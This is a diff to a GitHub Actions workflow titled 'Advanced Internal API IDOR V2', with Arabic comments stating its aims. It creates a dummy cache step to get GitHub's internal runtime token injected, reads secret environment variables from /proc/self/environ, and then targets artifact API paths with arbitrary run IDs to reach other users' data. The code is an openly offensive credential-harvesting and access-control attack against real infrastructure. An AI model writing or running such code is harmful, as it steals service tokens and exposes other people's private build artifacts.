@@ -1,26 +1,30 @@
-name: Advanced Internal API IDOR
+name: Advanced Internal API IDOR V2
 on: [push]
 jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      # خطوة وهمية لإجبار GitHub على حقن متغيرات الـ Runtime
-      - name: Dummy Cache Trigger
+      # 1. إنشاء ملف وهمي لكي تنجح عملية حفظ الكاش وتُحقن المتغيرات
+      - name: Create Dummy Cache File
+        run: |
+          mkdir -p ~/.npm
+          echo "dummy data" > ~/.npm/dummy.txt
+      
+      # 2. حفظ الكاش (هنا سيتم حقن ACTIONS_RUNTIME_TOKEN في الذاكرة)
+      - name: Save Dummy Cache
         uses: actions/cache@v3
         with:
-          path: |
-            ~/.npm
+          path: ~/.npm
           key: ${{ runner.os }}-dummy-${{ github.run_id }}
-          restore-keys: |
-            ${{ runner.os }}-dummy-
       
+      # 3. استخراج التوكن وتنفيذ هجوم IDOR
       - name: Tamper API Requests for IDOR
         run: |
           node -e "
             const fs = require('fs');
             const https = require('https');
 
-            // 1. استخراج المتغيرات السرية من ذاكرة الـ Runner
+            // استخراج المتغيرات السرية من ذاكرة الـ Runner
             const envStr = fs.readFileSync('/proc/self/environ', 'utf8');
             const envVars = envStr.split('\0');
             const env = {};
@@ -35,8 +39,7 @@ jobs:
             if (runtimeUrl && token) {
               console.log('Successfully extracted internal token and URL.');
               
-              // 2. المسار الخاص بطلب الـ Artifacts
-              // نقوم بتغيير الـ Run ID إلى أرقام عشوائية لمحاولة الوصول لبيانات مستخدمين آخرين
+              // مسارات الـ API الخاصة بالـ Artifacts مع أرقام Run ID عشوائية
               const idorTargets = [
                 runtimeUrl + '_apis/runs/1/artifacts?api-version=6.0-preview.1',
                 runtimeUrl + '_apis/runs/9999999999/artifacts?api-version=6.0-preview.1',
